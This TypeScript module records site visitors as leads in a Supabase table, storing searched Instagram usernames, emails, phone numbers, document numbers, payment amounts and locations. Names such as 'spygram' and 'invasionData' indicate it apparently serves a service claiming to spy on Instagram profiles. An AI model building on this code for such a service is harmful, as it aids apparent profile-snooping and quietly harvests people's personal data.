import { supabase } from '../integrations/supabase/client';

// Trava global para evitar envios duplicados/simultâneos
let isTrackingInProgress = false;

export const trackLead = async (data: {
  username_searched?: string;
  full_name?: string;
  profile_pic?: string;
  email?: string;
  phone?: string;
  document?: string;
  status?: string;
  amount?: number; 
  city?: string;
  state?: string;
  ip_address?: string;
}) => {
  // 1. Bloqueio Permanente: Verifica se este navegador já foi banido
  if (localStorage.getItem('spygram_banned_session') === 'true') {
    return;
  }

  // 2. Trava de Concorrência
  if (isTrackingInProgress) return;
  isTrackingInProgress = true;

  try {
    const userAgent = navigator.userAgent;
    
    // Se o status for 'pesquisou', limpamos o ID da sessão para forçar um novo INSERT
    if (data.status === 'pesquisou') {
      sessionStorage.removeItem('current_lead_id');
    }

    let existingLeadId = sessionStorage.getItem('current_lead_id');
    
    // Tenta enriquecer os dados com o que já temos na sessão se estiverem faltando
    const invasionDataRaw = sessionStorage.getItem('invasionData');
    const invasionData = invasionDataRaw ? JSON.parse(invasionDataRaw) : null;

    const enrichedData = {
      ...data,
      username_searched: data.username_searched || invasionData?.profileData?.username,
      profile_pic: data.profile_pic || invasionData?.profileData?.profilePicUrl,
      city: data.city || invasionData?.userCity
    };

    const updateData: any = { ...enrichedData };
    
    if (data.amount !== undefined) {
      updateData.total_amount = data.amount;
      delete updateData.amount;
    }

    // 3. Tenta ATUALIZAR o lead existente se houver um ID ativo na sessão
    if (existingLeadId) {
      const { error, count } = await supabase
        .from('leads')
        .update({
          ...updateData,
          updated_at: new Date().toISOString()
        }, { count: 'exact' })
        .eq('id', existingLeadId);
      
      if (!error && count && count > 0) {
        isTrackingInProgress = false;
        return;
      }

      if (!error && count === 0) {
        // Se o ID existia mas não foi encontrado, limpa para criar um novo
        sessionStorage.removeItem('current_lead_id');
        existingLeadId = null;
      }
    }

    // 4. Cria um novo registro (Sempre cai aqui se for status 'pesquisou' ou se for o primeiro acesso)
    const { data: newLead, error: insertError } = await supabase
      .from('leads')
      .insert([{
        ...updateData,
        user_agent: userAgent
      }])
      .select()
      .single();

    if (!insertError && newLead) {
      sessionStorage.setItem('current_lead_id', newLead.id);
    }
  } catch (err) {
    // Silencioso
  } finally {
    isTrackingInProgress = false;
  }
};